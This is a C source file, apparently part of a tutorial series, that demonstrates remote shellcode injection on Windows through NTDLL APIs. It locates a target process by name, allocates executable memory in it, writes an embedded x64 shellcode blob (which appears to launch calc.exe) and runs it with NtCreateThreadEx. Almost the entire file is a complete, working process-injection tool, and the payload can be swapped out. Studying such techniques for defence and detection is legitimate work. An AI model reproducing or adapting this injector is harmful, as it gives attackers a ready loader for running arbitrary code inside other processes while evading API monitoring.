// This code will server as an example of what shellcode injection using only NTDLL APIs looks like. Most of it should be fairly familiar from previous files so i wont be explaining most of it. Just some breif comments here and there

// To do List:
// Build NTDLL Structs
// Openprocess with NtOpenProcess
// Allocate memory using NtAllocateVirtual
// Copy Shellcode with NtWriteVirtualMemory
// Create Thread with NtCreateThreadEx

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Structs
// We need a few extras cuz NTAPIs are high maintenance
typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _PS_ATTRIBUTE {
    ULONG Attribute;
    SIZE_T Size;
    union{
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI* pNtOpenProcess) (
    PHANDLE hProcess, // Pointer to a handle. This function returns a handle to the target process and this pointer indicates where it will be stored.
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    CLIENT_ID ClientId // A CLIENT_ID Object
);


typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory) (
    HANDLE hProcess, // Handle to a process opened with PROCESS_VM_OPERATION access
    PVOID *BaseAddress, // If not zero, the system will try to use this as the base address of allocated memory. If zero, it will use the first free space it finds
    ULONG ZeroBits, 
    PULONG RegionSize, // Amount of bytes to allocate
    ULONG AllocationType, // MEM_RESERVE or MEM_COMMIT
    ULONG Protect // Combination of PAGE_*** attributes (ie PAGE_EXECUTEREAD)
);


typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory) (
    HANDLE hProcess, // Handle to a process
    PVOID BaseAddress, // Base Address to begin writing at
    PVOID Buffer, // Data to write
    ULONG NumberOfBytesToWrite, // Length of data
    PULONG NumberOfBytesWriten OPTIONAL // Pointer to a ULONG that will store the total amount of bytes written
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
    PHANDLE hThread, // Pointer to a handle. This function returns a handle to the created thread and this pointer indicates where to store it.
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE hProcess, // Handle to the target process
    PVOID lpStartAddress, // Address that the thread should begin executing from
    PVOID lpParameter,
    ULONG Flags, // Creating flags
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    PVOID lpBytesBuffer
);

unsigned char payload[] = {
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
};
size_t payload_len = sizeof(payload);

// Debug Symbols
char ok[4] = "(+)";
char in[4] = "(*)";
char err[4] = "(-)";
char ar[12] = "---------->";

int FindTarget(const char* procname){
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcSnap == INVALID_HANDLE_VALUE){
        printf("\n%s Failed to take snapshot, error: %ld", err, GetLastError());

        return EXIT_FAILURE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(hProcSnap, &pe32)){

        printf("\n%s Failed to parse snapshot, error: %ld", err, GetLastError());
        CloseHandle(hProcSnap);
        return EXIT_FAILURE;
    }
    
    while(Process32Next(hProcSnap, &pe32)){
        if (strcmp(pe32.szExeFile, procname) == 0){
            pid = pe32.th32ProcessID;
            break;            
        }       
    }
    CloseHandle(hProcSnap);
    return pid;
}

int main(int argc, char* argv[]){
    NTSTATUS status;
    HMODULE hNTDLL;
    HANDLE hProc;
    HANDLE hThread;
    DWORD PID = 0;
    void* rBaseAddres = NULL;

    if(argc != 2 || argv[1] == NULL){
        printf("\n%s Usage: %s <process name>\n ", err, argv[0]);
        return EXIT_FAILURE;
    }

    const char * procname = argv[1];

    PID = FindTarget(procname);
    if (PID == 0 || PID == EXIT_FAILURE){
        printf("\n%s Failed to find target", err);
        return EXIT_FAILURE;
    }

    printf("\n%s Target %s found, PID = %d", ok, procname, PID);

    CLIENT_ID clientId = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };

    hNTDLL = GetModuleHandleW(L"ntdll");
    if (!hNTDLL || hNTDLL == NULL){
        printf("\n%s Failed to get handle to NTDLL, error: %ld", err, GetLastError());
        CloseHandle(hNTDLL);
        return EXIT_FAILURE;
    }

    printf("\n%s Got handle to NTDLL %s 0x", ok, ar, &hNTDLL);

    printf("\n%s Finding NTDLL Function Addresses", ok);

    pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    printf("\n%s Found NtOpenProcess %s 0x%p", ok, ar, &NtOpenProcess);
    printf("\n\t%s Created pointer to NtOpenProcess", in);

    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    printf("\n%s Found NtCreateThreadEx %s 0x%p", ok, ar, &NtCreateThreadEx);
    printf("\n\t%s Created pointer to NtCreateThreadEx", in);

    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    printf("\n%s Found NtAllocateVirtualMemory %s 0x%p", ok, ar, &NtAllocateVirtualMemory);
    printf("\n\t%s Created pointer to NtAllocateVirtualMemory", in);

    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    printf("\n%s Found NtWriteVirtualMemory %s 0x%p", ok, ar, &NtWriteVirtualMemory);
    printf("\n\t%s Created pointer to NtWriteVirtualMemory", in);

    status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &objectAttributes, clientId);
    if (!hProc || hProc == NULL){
       printf("\n%s Couldnt get handle to %s [%d], error: %ld", err, procname, PID, GetLastError());
       CloseHandle(hNTDLL);
       return EXIT_FAILURE;
    }

    status = NtAllocateVirtualMemory(hProc, &rBaseAddres, 0, (PULONG)&payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("\n%s Allocated %zu bytes in %s %s 0x%p", ok, sizeof(payload), procname, ar, rBaseAddres);

    status = NtWriteVirtualMemory(hProc, rBaseAddres, payload, sizeof(payload), NULL);
    printf("\n%s Wrote %zu bytes in %s %s 0x%p", ok, sizeof(payload), procname, ar, rBaseAddres);

    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, rBaseAddres, NULL, 0, 0, 0, 0, NULL);

    if(!hThread || hThread == NULL){
       printf("\n%s Failed to create thread, error: %ld", err, GetLastError());
       return EXIT_FAILURE;
    }

    printf("\n%s Thread created...", ok);
    printf("\n%s Waiting for execution to complete...", ok);

    WaitForSingleObject(hThread, INFINITE);
    printf("\n%s Execution completed", ok);

    printf("\n%s Cleaning up...", in);
    CloseHandle(hThread);
    CloseHandle(hProc);
    CloseHandle(hNTDLL);

    printf("\n%s Done!", ok);    
    return EXIT_SUCCESS;
}


/*
Resources:
    https://malapi.io/
    https://www.vergiliusproject.com/
    http://undocumented.ntinternals.net/
*/